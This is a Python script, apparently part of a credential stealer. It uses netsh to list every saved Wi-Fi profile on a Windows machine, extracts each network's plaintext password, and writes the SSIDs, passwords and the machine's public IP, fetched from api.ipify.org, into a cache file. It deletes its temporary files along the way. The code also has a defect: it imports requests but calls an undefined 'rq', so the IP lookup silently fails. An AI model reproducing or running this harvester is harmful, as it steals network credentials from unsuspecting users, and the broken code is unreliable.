import subprocess
import requests
from os import remove
def gettingwifi():
    name = []
    password1 = {}
    process = subprocess.Popen(['netsh'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True)

    process.stdin.write('wlan show profiles\n')
    process.stdin.flush()

    output, errors = process.communicate()
    with open("tempnetsh.txt","wt") as f:
        f.write(output)
    with open("tempnetsh.txt","rt") as f1:
        for line in f1:
            a = line
            if "All User Profile" in a:
                a = a.strip()
                a = a.replace("All User Profile","")
                a = a.replace(":","")
                a = a.strip()
                name.append(a)
            else:
                pass
    process.stdin.close()
    process.stdout.close()
    process.stderr.close()
    process1 = subprocess.Popen(['netsh'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True)
    for i in name:
        srt123 = f'wlan show profile "{i}" key=clear\n'
        process1.stdin.write(srt123)
        process1.stdin.flush()
    output, errors = process1.communicate()
    with open("tempnetsh2.txt","wt") as f:
        f.write(f"{output}")
    process.stdin.close()
    process.stdout.close()
    process.stderr.close()
    remove("tempnetsh.txt")
    with open("tempnetsh2.txt","rt") as file:
        for line in file:
            if "SSID name" in line:
                line = line.replace("SSID name","")
                line = line.replace(":","")
                ssid = line.strip()
            if "Key Content" in line:
                line = line.replace("Key Content","")
                line = line.replace(":","")
                password = line.strip()
            else:
                continue
            password1[ssid] = password
    remove("tempnetsh2.txt")
    with open("tempcache.txt","at") as lol:
        for key,value in password1.items():
            key = key.replace('"',"")
            lol.write(f"{key}\n") 
            lol.write(f"=> {value}\n\n")
        ip = get_ip()
        lol.write(f"Ip +> {ip} \n")
def get_ip():
    try:
        response = rq.get('https://api.ipify.org')
        if response.status_code == 200:
            return response.text
        else:
            pass
    except Exception as e:
        pass
gettingwifi()